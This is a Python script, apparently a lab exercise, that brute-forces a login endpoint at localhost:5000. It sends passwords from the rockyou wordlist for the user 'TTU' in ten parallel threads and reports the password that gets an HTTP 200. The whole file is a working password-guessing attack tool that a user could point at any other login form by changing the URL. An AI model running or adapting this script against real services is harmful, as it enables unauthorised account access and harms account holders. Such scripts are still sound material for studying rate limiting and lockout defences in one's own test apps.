import requests
import time
from concurrent.futures import ThreadPoolExecutor

URL = "http://127.0.0.1:5000/login"
WORDLIST_PATH = "rockyou.txt"
THREADS = 10  # Number of simultaneous requests
FOUND = False

# Use a session for connection pooling
session = requests.Session()

def attempt_password(password):
    global FOUND
    if FOUND:
        return

    payload = {"username": "TTU", "password": password}
    
    try:
        response = session.post(URL, json=payload, timeout=5)
        if response.status_code == 200:
            print(f"\n[+] SUCCESS! Password found: {password}")
            FOUND = True
    except Exception:
        pass

def run_test():
    global FOUND
    print(f"[*] Starting multi-threaded attack with {THREADS} threads...")
    start_time = time.time()

    try:
        with open(WORDLIST_PATH, 'r', encoding='latin-1') as file:
            # Using a ThreadPoolExecutor to manage our worker threads
            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                for line in file:
                    if FOUND:
                        break
                    
                    password = line.strip()
                    executor.submit(attempt_password, password)

    except FileNotFoundError:
        print("[-] Wordlist not found.")
        return

    if not FOUND:
        print("[-] Password not found.")
    
    end_time = time.time()
    print(f"[*] Finished in {end_time - start_time:.2f} seconds.")

if __name__ == "__main__":
    run_test()